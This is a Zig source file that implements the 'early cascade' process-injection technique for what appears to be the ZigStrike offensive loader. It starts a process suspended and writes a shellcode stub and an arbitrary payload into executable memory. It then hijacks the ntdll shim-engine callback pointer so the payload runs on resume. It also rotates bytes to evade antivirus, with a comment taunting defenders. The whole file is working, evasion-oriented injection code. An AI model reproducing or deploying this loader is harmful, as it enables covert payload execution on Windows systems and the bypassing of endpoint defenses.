// author : @zux0x3a
// date : 2025-03-28
// description : this is a zig implementation of the cascade injection technique that shared by Outflank
// this code base is modified to work with ZigStrike 2.0

const std = @import("std");
const windows = std.os.windows;
const INVALID_HANDLE_VALUE = windows.INVALID_HANDLE_VALUE;
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const PVOID = *anyopaque;
const kernel32 = windows.kernel32;

const STATUS_SUCCESS: i32 = 0x00000000;
const STATUS_UNSUCCESSFUL: i32 = -0x3FFFFFFF; // 0xC0000001
const STATUS_INVALID_PARAMETER: i32 = -0x3FFFFFF3; // 0xC000000D
const INVALID_FILE_SIZE: DWORD = 4294967295; // COPIED FROM RUST CODE https://tyleo.github.io/sharedlib/doc/winapi/fileapi/constant.INVALID_FILE_SIZE.html
const CREATE_SUSPENDED: DWORD = 0x00000004;

const IMAGE_FILE_HEADER = extern struct {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
};
const IMAGE_DATA_DIRECTORY = extern struct {
    VirtualAddress: u32,
    Size: u32,
};
pub const IMAGE_SECTION_HEADER = extern struct {
    name: [8]windows.UCHAR,
    virtual_size: windows.ULONG,
    virtual_address: windows.ULONG,
    size_of_raw_data: windows.ULONG,
    pointer_to_raw_data: windows.ULONG,
    pointer_to_relocations: windows.ULONG,
    pointer_to_linenumbers: windows.ULONG,
    number_of_relocations: windows.USHORT,
    number_of_linenumbers: windows.USHORT,
    characteristics: windows.ULONG,
};

const IMAGE_DOS_HEADER = extern struct {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [4]u16,
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [10]u16,
    e_lfanew: i32,
};
const IMAGE_OPTIONAL_HEADER32 = extern struct {
    Magic: u16,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32,
    SizeOfInitializedData: u32,
    SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32,
    BaseOfCode: u32,
    BaseOfData: u32,
    ImageBase: u32,
    SectionAlignment: u32,
    FileAlignment: u32,
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32,
    SizeOfImage: u32,
    SizeOfHeaders: u32,
    CheckSum: u32,
    Subsystem: u16,
    DllCharacteristics: u16,
    SizeOfStackReserve: u32,
    SizeOfStackCommit: u32,
    SizeOfHeapReserve: u32,
    SizeOfHeapCommit: u32,
    LoaderFlags: u32,
    NumberOfRvaAndSizes: u32,
    DataDirectory: [16]IMAGE_DATA_DIRECTORY,
};

const IMAGE_OPTIONAL_HEADER64 = extern struct {
    Magic: u16,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32,
    SizeOfInitializedData: u32,
    SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32,
    BaseOfCode: u32,
    ImageBase: u64,
    SectionAlignment: u32,
    FileAlignment: u32,
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32,
    SizeOfImage: u32,
    SizeOfHeaders: u32,
    CheckSum: u32,
    Subsystem: u16,
    DllCharacteristics: u16,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: u32,
    NumberOfRvaAndSizes: u32,
    DataDirectory: [16]IMAGE_DATA_DIRECTORY,
};

const IMAGE_NT_HEADERS32 = extern struct {
    Signature: DWORD,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER32,
};

const IMAGE_NT_HEADERS64 = extern struct {
    Signature: DWORD,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
};

const IMAGE_NT_HEADERS = if (@sizeOf(usize) == 8) IMAGE_NT_HEADERS64 else IMAGE_NT_HEADERS32;

// Buffer struct
pub const Buffer = struct {
    buffer: ?[*]u8,
    length: usize,
};

pub const Pattern = struct {
    bytes: []const u8,
    mask: []const u8,
};

// Helper function for section name length
fn sectionNameLength(section_name: [*]const u8) usize {
    var i: usize = 0;
    while (i < 8) : (i += 1) {
        if (section_name[i] == 0) {
            return i;
        }
    }
    return 8;
}
const STARTUPINFOA = extern struct {
    cb: DWORD,
    lpReserved: ?windows.LPSTR,
    lpDesktop: ?windows.LPSTR,
    lpTitle: ?windows.LPSTR,
    dwX: DWORD,
    dwY: DWORD,
    dwXSize: DWORD,
    dwYSize: DWORD,
    dwXCountChars: DWORD,
    dwYCountChars: DWORD,
    dwFillAttribute: DWORD,
    dwFlags: DWORD,
    wShowWindow: windows.WORD,
    cbReserved2: windows.WORD,
    lpReserved2: ?*windows.BYTE,
    hStdInput: ?HANDLE,
    hStdOutput: ?HANDLE,
    hStdError: ?HANDLE,
};

extern "kernel32" fn CreateProcessA(
    lpApplicationName: ?windows.LPCSTR,
    lpCommandLine: ?windows.LPSTR,
    lpProcessAttributes: ?*windows.SECURITY_ATTRIBUTES,
    lpThreadAttributes: ?*windows.SECURITY_ATTRIBUTES,
    bInheritHandles: windows.BOOL,
    dwCreationFlags: DWORD,
    lpEnvironment: ?*anyopaque,
    lpCurrentDirectory: ?windows.LPCSTR,
    lpStartupInfo: *STARTUPINFOA,
    lpProcessInformation: *windows.PROCESS_INFORMATION,
) callconv(windows.WINAPI) windows.BOOL;

extern "Kernel32" fn CreateFileA(
    lpFileName: windows.LPCSTR,
    dwDesiredAccess: windows.DWORD,
    dwShareMode: windows.DWORD,
    lpSecurityAttributes: ?*windows.SECURITY_ATTRIBUTES,
    dwCreationDisposition: windows.DWORD,
    dwFlagsAndAttributes: windows.DWORD,
    hTemplateFile: ?windows.HANDLE,
) callconv(windows.WINAPI) windows.HANDLE;

extern "Kernel32" fn GetFileSize(
    hFile: windows.HANDLE,
    lpFileSizeHigh: ?*windows.DWORD,
) callconv(windows.WINAPI) windows.DWORD;

extern "Kernel32" fn VirtualAllocEx(
    hProcess: windows.HANDLE,
    lpAddress: ?*windows.LPVOID,
    dwSize: windows.SIZE_T,
    flAllocationType: windows.DWORD,
    flProtect: windows.DWORD,
) callconv(windows.WINAPI) windows.LPVOID;

extern "Kernel32" fn GetModuleHandleA(
    lpModuleName: windows.LPCSTR,
) callconv(windows.WINAPI) windows.HMODULE;

extern "Kernel32" fn ResumeThread(
    hThread: windows.HANDLE,
) callconv(windows.WINAPI) windows.DWORD;
extern "Kernel32" fn WriteProcessMemory(
    hProcess: windows.HANDLE,
    lpBaseAddress: windows.LPCVOID,
    lpBuffer: windows.LPCVOID,
    nSize: windows.SIZE_T,
    lpNumberOfBytesWritten: ?*windows.SIZE_T,
) callconv(windows.WINAPI) windows.BOOL;

extern "Kernel32" fn VirtualProtectEx(
    hProcess: windows.HANDLE,
    lpAddress: windows.LPCVOID,
    dwSize: windows.SIZE_T,
    flNewProtect: windows.DWORD,
    lpflOldProtect: ?*windows.DWORD,
) callconv(windows.WINAPI) windows.BOOL;

extern "Kernel32" fn ReadProcessMemory(
    hProcess: windows.HANDLE,
    lpBaseAddress: windows.LPCVOID,
    lpBuffer: windows.LPVOID,
    nSize: windows.SIZE_T,
    lpNumberOfBytesRead: ?*windows.SIZE_T,
) callconv(windows.WINAPI) windows.BOOL;

// PE Section Base function
fn mmPeSectionBase(module_base: PVOID, section_name: [*]const u8) ?PVOID {
    const dos_header = @as(*const IMAGE_DOS_HEADER, @ptrFromInt(@intFromPtr(module_base)));
    if (dos_header.e_magic != 0x5A4D) {
        return null;
    }
    const nt_header = @as(*const IMAGE_NT_HEADERS, @ptrFromInt(@intFromPtr(module_base) + @as(usize, @as(u32, @intCast(dos_header.e_lfanew)))));

    //const nt_header = @as(*const IMAGE_NT_HEADERS, @ptrFromInt(@intFromPtr(module_base) + @as(usize, @intCast(dos_header.e_lfanew))));

    const section_header = @as(*IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(nt_header) + @sizeOf(IMAGE_NT_HEADERS)));

    var i: u16 = 0;
    while (i < nt_header.FileHeader.NumberOfSections) : (i += 1) {
        const section = @as(*IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(section_header) + @sizeOf(IMAGE_SECTION_HEADER) * i));
        const section_ptr = @as(*IMAGE_SECTION_HEADER, section);

        const name_len = sectionNameLength(section_name);
        if (name_len > 0 and std.mem.eql(u8, section_ptr.name[0..name_len], section_name[0..name_len])) {
            return @ptrFromInt(@intFromPtr(module_base) + section_ptr.virtual_address);
        }
    }

    return null;
}

// this is deprecated but i'm keeping it for reference
fn getSectionSize(module_base: PVOID, section_name: [*:0]const u8) ?usize {
    const dos_header = @as(*const IMAGE_DOS_HEADER, @ptrFromInt(@intFromPtr(module_base)));
    const nt_header = @as(*const IMAGE_NT_HEADERS, @ptrFromInt(@intFromPtr(module_base) + @as(usize, @as(u32, @intCast(dos_header.e_lfanew)))));
    const section_header = @as(*IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(nt_header) + @sizeOf(IMAGE_NT_HEADERS)));

    var i: u16 = 0;
    while (i < nt_header.FileHeader.NumberOfSections) : (i += 1) {
        const section = @as(*IMAGE_SECTION_HEADER, @ptrFromInt(@intFromPtr(section_header) + @sizeOf(IMAGE_SECTION_HEADER) * i));

        const name_len = std.mem.len(section_name);
        if (std.mem.eql(u8, section.name[0..name_len], section_name[0..name_len])) {
            return section.virtual_size;
        }
    }

    return null;
}

// encode the function pointer.
fn sysEncodeFnPointer(fn_pointer: PVOID) PVOID {
    const shared_user_cookie = @as(*const u32, @ptrFromInt(0x7FFE0330)).*;

    const encoded = std.math.rotr(u64, @as(u64, shared_user_cookie) ^ @intFromPtr(fn_pointer), @as(u6, @intCast(shared_user_cookie & 0x3F)));
    return @ptrFromInt(encoded);
}

fn fileRead(file_name: []const u8, buffer: *Buffer) bool {
    //std.debug.print("--File Read Execution--\n", .{});

    var bytes_read: DWORD = 0;

    if (file_name.len == 0) {
        //  std.debug.print("[-] File name is empty\n", .{});
        return false;
    }

    // Convert filename to null-terminated string
    var file_name_z: [std.fs.MAX_PATH_BYTES]u8 = undefined;
    @memcpy(file_name_z[0..file_name.len], file_name);
    file_name_z[file_name.len] = 0;

    // Open file
    const file_handle = CreateFileA(
        @as([*:0]const u8, @ptrCast(&file_name_z[0])),
        windows.GENERIC_READ,
        0,
        null,
        windows.OPEN_EXISTING,
        windows.FILE_ATTRIBUTE_NORMAL,
        null,
    );

    if (file_handle == INVALID_HANDLE_VALUE) {
        //   std.debug.print("[-] CreateFileA Failed: {}\n", .{kernel32.GetLastError()});
        return false;
    }
    defer windows.CloseHandle(file_handle);

    // Get file size
    const length = GetFileSize(file_handle, null);
    if (length == INVALID_FILE_SIZE) {
        //  std.debug.print("[-] GetFileSize Failed: {}\n", .{kernel32.GetLastError()});
        return false;
    }

    // Allocate memory
    const process_heap = kernel32.GetProcessHeap() orelse {
        // std.debug.print("[-] GetProcessHeap Failed\n", .{});
        return false;
    };

    const data = @as([*]u8, @ptrCast(kernel32.HeapAlloc(
        process_heap,
        0x00000008, // HEAP_ZERO_MEMORY
        length,
    ) orelse {
        //  std.debug.print("[-] HeapAlloc Failed: {}\n", .{kernel32.GetLastError()});
        return false;
    }));

    // Read file
    const read_success = kernel32.ReadFile(
        file_handle,
        data,
        length,
        &bytes_read,
        null,
    );

    if (read_success == 0 or bytes_read != length) {
        // std.debug.print("[-] ReadFile Failed: {}\n", .{kernel32.GetLastError()});
        _ = kernel32.HeapFree(process_heap, 0, data);
        return false;
    }

    // Set buffer
    buffer.buffer = data;
    buffer.length = length;

    return true;
}
// thanks to m4ul3r for nim code to resolve pointers : https://github.com/m4ul3r/malware/blob/main/nim/earlycascade_injection/main.nim
fn resolvePointers() struct { se_dll_loaded: PVOID, shims_enabled: PVOID } {
    var tmp = kernel32.GetProcAddress(GetModuleHandleA("ntdll.dll\x00"), "RtlQueryDepthSList\x00") orelse {
        //  std.debug.print("[-] Failed to get RtlQueryDepthSList\n", .{});
        return .{ .se_dll_loaded = undefined, .shims_enabled = undefined };
    };

    //std.debug.print("[i] RtlQueryDepthSList: 0x{x}\n", .{@intFromPtr(tmp)});

    var i: usize = 0;
    const max_scan = 1000; // Safety limit
    var scan_count: usize = 0;

    // scan until end of LdrpInitShimEngine (looking for either cc c3 or c3 cc)
    while (i != 2 and scan_count < max_scan) : (scan_count += 1) {
        const current = @as(*align(1) const u16, @ptrCast(tmp)).*;
        if (current == 0xc3cc or current == 0xccc3) { //first scan pattern should be c3cc and ccc3 but we need to check both
            i += 1;
            //std.debug.print("[+] Found end pattern {} at 0x{x}\n", .{ i, @intFromPtr(tmp) });
        }
        tmp = @ptrFromInt(@intFromPtr(tmp) + 1);
    }

    if (scan_count >= max_scan) {
        //std.debug.print("[-] Failed to find LdrpInitShimEngine end\n", .{});
        return .{ .se_dll_loaded = undefined, .shims_enabled = undefined };
    }

    scan_count = 0;
    // scan until 0x488b3d: mov rdi, qword [rel g_pfnSE_DllLoaded]
    while ((@as(*align(1) const u32, @ptrCast(tmp)).* & 0xFFFFFF) != 0x3d8b48 and scan_count < max_scan) : (scan_count += 1) {
        tmp = @ptrFromInt(@intFromPtr(tmp) + 1);
    }

    if (scan_count >= max_scan) {
        //std.debug.print("[-] Failed to find g_pfnSE_DllLoaded pattern\n", .{});
        return .{ .se_dll_loaded = undefined, .shims_enabled = undefined };
    }

    // g_pfnSE_DllLoaded offset
    const offset1 = @as(*align(1) const u32, @ptrCast(@as([*]const u8, @ptrCast(tmp)) + 3)).*;
    const g_pfn_se_dll_loaded = @as(*u8, @ptrFromInt(@intFromPtr(tmp) + offset1 + 7));

    scan_count = 0;
    // scan until 0x443825: cmp byte [rel g_ShimsEnabled], r12b
    while ((@as(*align(1) const u32, @ptrCast(tmp)).* & 0xFFFFFF) != 0x253844 and scan_count < max_scan) : (scan_count += 1) {
        tmp = @ptrFromInt(@intFromPtr(tmp) + 1);
    }

    if (scan_count >= max_scan) {
        //std.debug.print("[-] Failed to find g_ShimsEnabled pattern\n", .{});
        return .{ .se_dll_loaded = undefined, .shims_enabled = undefined };
    }

    // g_ShimsEnabled offset
    const offset2 = @as(*align(1) const u32, @ptrCast(@as([*]const u8, @ptrCast(tmp)) + 3)).*;
    const g_shims_enabled = @as(*u8, @ptrFromInt(@intFromPtr(tmp) + offset2 + 7));

    //std.debug.print("[i] g_ShimsEnabled:    0x{x}\n", .{@intFromPtr(g_shims_enabled)});
    //std.debug.print("[i] g_pfnSE_DllLoaded: 0x{x}\n", .{@intFromPtr(g_pfn_se_dll_loaded)});

    return .{
        .se_dll_loaded = g_pfn_se_dll_loaded,
        .shims_enabled = g_shims_enabled,
    };
}
fn ROTL(bytes: []u8, positions: u3) void {

    // this function rotates the bytes in the array by the specified number of positions
    for (bytes) |*b| {
        b.* = std.math.rotl(u8, b.*, positions);
    }
}

pub fn cascadeInject(process: [*:0]const u8, payload: *const Buffer, context: ?*const Buffer) i32 {
    //std.debug.print("--Cascade Injection Function--\n", .{});

    // Define CASCADE_STUB_X64
    var CASCADE_STUB_X64 = [_]u8{
        0x48, 0x83, 0xec, 0x38, // sub rsp, 38h
        0x33, 0xc0, // xor eax, eax
        0x45, 0x33, 0xc9, // xor r9d, r9d
        0x48, 0x21, 0x44, 0x24, 0x20, // and [rsp+38h+var_18], rax
        0x48, 0xba, // mov rdx,
        0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, // 8888888888888888h
        0xa2, // mov ds:[...], al
        0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, // 9999999999999999h
        0x92, 0x71, // mov r8, hey defender stop be so naive
        0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, // 7777777777777777h
        0x48, 0x8d, 0x48, 0xfe, // lea rcx, [rax-2]
        0x48, 0xb8, // mov rax,
        0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, // 6666666666666666h
        0xff, 0xd0, // call rax
        0x33, 0xc0, // xor eax, eax
        0x48, 0x83, 0xc4, 0x38, // add rsp, 38h
        0xc3, // retn
    };

    ROTL(CASCADE_STUB_X64[33..35], 7); // this will roate the 0x92 to 0x49 and 0x71 to 0xb8 which is the mov r8,

    // Initialize process and startup information
    var process_info: windows.PROCESS_INFORMATION = std.mem.zeroes(windows.PROCESS_INFORMATION);
    var startup_info: STARTUPINFOA = std.mem.zeroes(STARTUPINFOA);

    startup_info.cb = @sizeOf(STARTUPINFOA);

    // Validate input parameters
    if (payload.buffer == null) {
        return STATUS_INVALID_PARAMETER;
    }

    //std.debug.print("[+] Payload Check PASS\n", .{});

    // Create process in suspended state
    const success = CreateProcessA(
        null,
        @as([*:0]u8, @constCast(process)),
        null,
        null,
        0,
        CREATE_SUSPENDED,
        null,
        null,
        &startup_info,
        &process_info,
    );

    if (success == 0) {
        //std.debug.print("[-] CreateProcessA Failed: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }

    //std.debug.print("[+] CreateProcessA Created in Suspended State\n", .{});

    // Calculate memory length for allocation
    var length = CASCADE_STUB_X64.len + payload.length;
    if (context) |ctx| {
        length += ctx.length;
    }

    //std.debug.print("[+] Length: {}\n", .{length});

    // Allocate memory in target process
    const memory = VirtualAllocEx(
        process_info.hProcess,
        null,
        length,
        windows.MEM_RESERVE | windows.MEM_COMMIT,
        windows.PAGE_EXECUTE_READWRITE,
    );

    if (memory == windows.INVALID_HANDLE_VALUE) {
        //std.debug.print("[-] VirtualAllocEx Failed: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }

    //std.debug.print("[+] VirtualAllocEx PASS: {*}\n", .{memory});

    // Resolve .mrdata and .data sections
    const ntdll_str = "ntdll.dll\x00";
    const mrdata_str = ".mrdata\x00";
    const data_str = ".data\x00";

    const h_module = GetModuleHandleA(ntdll_str);
    // if (h_module == windows.INVALID_HANDLE_VALUE) {
    //     std.debug.print("Error: Could not get module handle for ntdll.dll\n", .{});
    //     return STATUS_UNSUCCESSFUL;
    // }

    const sec_mr_data = mmPeSectionBase(h_module, mrdata_str) orelse {
        //   std.debug.print("Section Base is NULL\n", .{});
        return STATUS_UNSUCCESSFUL;
    };

    const sec_data = mmPeSectionBase(h_module, data_str) orelse {
        //   std.debug.print("Sec Data is NULL\n", .{});
        return STATUS_UNSUCCESSFUL;
    };
    _ = sec_data;
    _ = sec_mr_data;
    //std.debug.print("[+] SecData: {*}\n", .{sec_data});
    //std.debug.print("[+] SecMrData: {*}\n", .{sec_mr_data});

    const pointers = resolvePointers();

    const g_pfn_se_dll_loaded = pointers.se_dll_loaded;
    const g_shims_enabled = pointers.shims_enabled;

    //std.debug.print("[+] Resolved .mrdata and .data sections\n", .{});
    // std.debug.print("[+] g_ShimsEnabled   : {*}\n", .{g_shims_enabled});
    // std.debug.print("[+] g_pfnSE_DllLoaded: {*}\n", .{g_pfn_se_dll_loaded});

    // Set up cascade_stub_x64 with appropriate values
    var g_value: usize = @intFromPtr(memory) + CASCADE_STUB_X64.len;
    //std.debug.print("[+] g_Value: {x}\n", .{g_value});

    // Copy values into CASCADE_STUB_X64
    @memcpy(CASCADE_STUB_X64[16..24].ptr, std.mem.asBytes(&g_value));
    @memcpy(CASCADE_STUB_X64[25..33].ptr, std.mem.asBytes(&g_shims_enabled));

    g_value = @intFromPtr(memory) + CASCADE_STUB_X64.len + payload.length;
    //std.debug.print("Payload.length: {}\n", .{payload.length});
    //std.debug.print("New g_Value: {x}\n", .{g_value});

    @memcpy(CASCADE_STUB_X64[35..43].ptr, std.mem.asBytes(&g_value));

    // Get NtQueueApcThread address
    const ntqueue_str = "NtQueueApcThread\x00";
    g_value = @intFromPtr(kernel32.GetProcAddress(h_module, ntqueue_str) orelse {
        //   std.debug.print("[-] GetProcAddress failed\n", .{});
        return STATUS_UNSUCCESSFUL;
    });

    //std.debug.print("[+] Last G_value: {x}\n", .{g_value});
    @memcpy(CASCADE_STUB_X64[49..57].ptr, std.mem.asBytes(&g_value));

    //std.debug.print("[+] Setup cascade_stub_x64 complete\n", .{});

    // Write cascade stub to memory
    var offset: u32 = 0;
    var success_write = WriteProcessMemory(
        process_info.hProcess,
        @ptrFromInt(@intFromPtr(memory) + offset),
        &CASCADE_STUB_X64,
        CASCADE_STUB_X64.len,
        null,
    );

    if (success_write == 0) {
        // std.debug.print("[-] WriteProcessMemory for stub Failed: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }

    offset += @as(u32, CASCADE_STUB_X64.len);

    // Write payload
    success_write = WriteProcessMemory(
        process_info.hProcess,
        @ptrFromInt(@intFromPtr(memory) + offset),
        payload.buffer.?,
        payload.length,
        null,
    );

    if (success_write == 0) {
        //   std.debug.print("[-] WriteProcessMemory for payload Failed: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }

    // std.debug.print("[+] Offset Before: {}\n", .{offset});

    // Write context if provided
    if (context) |ctx| {
        offset += @intCast(payload.length);
        success_write = WriteProcessMemory(
            process_info.hProcess,
            @ptrFromInt(@intFromPtr(memory) + offset),
            ctx.buffer.?,
            ctx.length,
            null,
        );

        if (success_write == 0) {
            //  std.debug.print("[-] WriteProcessMemory for context Failed: {}\n", .{kernel32.GetLastError()});
            return STATUS_UNSUCCESSFUL;
        }
    }

    //std.debug.print("[+] Offset After: {}\n", .{offset});

    // Write shim enabled value
    const shim_enabled_value: u8 = 1;
    success_write = WriteProcessMemory(
        process_info.hProcess,
        g_shims_enabled,
        &shim_enabled_value,
        1,
        null,
    );

    if (success_write == 0) {
        // std.debug.print("[-] WriteProcessMemory for shim enable Failed: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }

    // std.debug.print("[+] WriteProcessMemory for shim success: {}\n", .{success_write});

    // Encode function pointer
    const encoded_fn_ptr = sysEncodeFnPointer(memory);
    // std.debug.print("[+] SysEncode Value: {*}\n", .{encoded_fn_ptr});

    // Check memory accessibility
    var buffer: u8 = 0;
    const read_success = ReadProcessMemory(
        process_info.hProcess,
        g_pfn_se_dll_loaded,
        &buffer,
        1,
        null,
    );

    if (read_success == 0) {
        //  std.debug.print("[-] ReadProcessMemory check failed for g_pfn_se_dll_loaded: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }
    // std.debug.print("[+] ReadProcessMemory check passed for g_pfn_se_dll_loaded\n", .{});

    // Change memory protection
    var old_protection: DWORD = undefined;
    const protect_success = VirtualProtectEx(
        process_info.hProcess,
        g_pfn_se_dll_loaded,
        @sizeOf(usize),
        windows.PAGE_READWRITE,
        &old_protection,
    );

    if (protect_success == 0) {
        //    std.debug.print("[-] VirtualProtectEx failed for g_pfn_se_dll_loaded: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }

    //  std.debug.print("[+] VirtualProtectEx changed protection for g_pfn_se_dll_loaded to PAGE_READWRITE\n", .{});
    //  std.debug.print("[*] [DEBUG] Encoded function pointer: {*}\n", .{encoded_fn_ptr});
    //  std.debug.print("[*] Size of encoded_fn_ptr: {}\n", .{@sizeOf(@TypeOf(encoded_fn_ptr))});

    // Write encoded function pointer
    success_write = WriteProcessMemory(
        process_info.hProcess,
        g_pfn_se_dll_loaded,
        @ptrCast(&encoded_fn_ptr),
        @sizeOf(usize),
        null,
    );

    if (success_write == 0) {
        //  std.debug.print("[-] WriteProcessMemory for g_pfnSE_DllLoaded Failed: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }

    // Resume thread
    const result = ResumeThread(process_info.hThread);
    if (result == std.math.maxInt(u32)) {
        // std.debug.print("[-] ResumeThread Failed: {}\n", .{kernel32.GetLastError()});
        return STATUS_UNSUCCESSFUL;
    }

    return STATUS_SUCCESS;
}
